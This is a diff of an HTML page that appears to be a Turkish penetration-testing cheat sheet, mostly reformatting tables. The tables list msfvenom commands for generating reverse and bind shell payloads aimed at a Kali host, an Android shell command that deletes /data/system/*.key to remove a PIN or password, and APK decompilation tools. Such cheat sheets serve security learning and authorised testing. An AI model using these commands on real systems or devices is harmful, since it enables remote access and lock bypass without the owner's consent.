@@ -115,7 +115,7 @@
     <tr><td><br></td></tr>
     <tr><th>MSFVenom Komutları</th><th>Description</th></tr>
     <tr><td class="kod">msfvenom -p [payload] LHOST=[Kali Ip] LPORT=[Kali Port] -f exe -o dosya.exe</td><td class="desc">Reverse shell oluşturma.</td></tr>
-    <tr><td class="kod">msfvenom -p [payload] LPORT=[Magdur port]</td><td class="desc">Bind shell oluşturma.</td></tr>
+    <tr><td class="kod">msfvenom -p [payload] LPORT=[Magdur port] -f type -o output</td><td class="desc">Bind shell oluşturma.</td></tr>
 
 
     <tr><td><br></td></tr>
@@ -159,31 +159,17 @@
 
     <tr><td><br></td></tr>
 
-    <tr><th>Shell Android Komutlari</th>  <th>Description</th></tr>
-    <tr>
-      <td>#pm list packages</td>  <td>kurulu paketleri listeler</td>
-    </tr>
-    <tr>
-      <td>#rm /data/system/*.key </td>  <td>pin veya password kaldirma.</td>
-    </tr>
-    <tr>
-      <td>#id</td>  <td>userid gosterir.</td>
-    </tr>
+    <tr><th>Shell Android Komutlari</th><th>Description</th></tr>
+    <tr><td>#pm list packages</td><td>kurulu paketleri listeler</td></tr>
+    <tr><td>#rm /data/system/*.key </td><td>pin veya password kaldirma.</td></tr>
+    <tr><td>#id</td><td>userid gosterir.</td></tr>
 
     <tr><td><br></td></tr>
 
-    <tr>
-      <th>Statik Analiz</th>  <th>Description</th>
-    </tr>
-    <tr>
-      <td>$apktool d [apkfile] -o [output]</td>  <td>manifesto,resource ve dex dosyasi elde edilir.</td>
-    </tr>
-    <tr>
-      <td>$d2j-dex2jar.sh [apk] -o [output].jar</td>  <td>jar kodlara cevirir.</td>
-    </tr>
-    <tr>
-      <td>Jd-Gui</td>  <td><a href="http://www.javadecompiler.com" target="_blank">www.javadecompiler.com</a> dex2jardan alinmis dosyanin komutlarini gosterir gui.</td>
-    </tr>
+    <tr><th>Statik Analiz</th><th>Description</th></tr>
+    <tr><td>$apktool d [apkfile] -o [output]</td><td>manifesto,resource ve dex dosyasi elde edilir.</td></tr>
+    <tr><td>$d2j-dex2jar.sh [apk] -o [output].jar</td><td>jar kodlara cevirir.</td></tr>
+    <tr><td>Jd-Gui</td>  <td><a href="http://www.javadecompiler.com" target="_blank">www.javadecompiler.com</a> dex2jardan alinmis dosyanin komutlarini gosterir gui.</td></tr>
 
     <tr><td><br></td></tr>
 
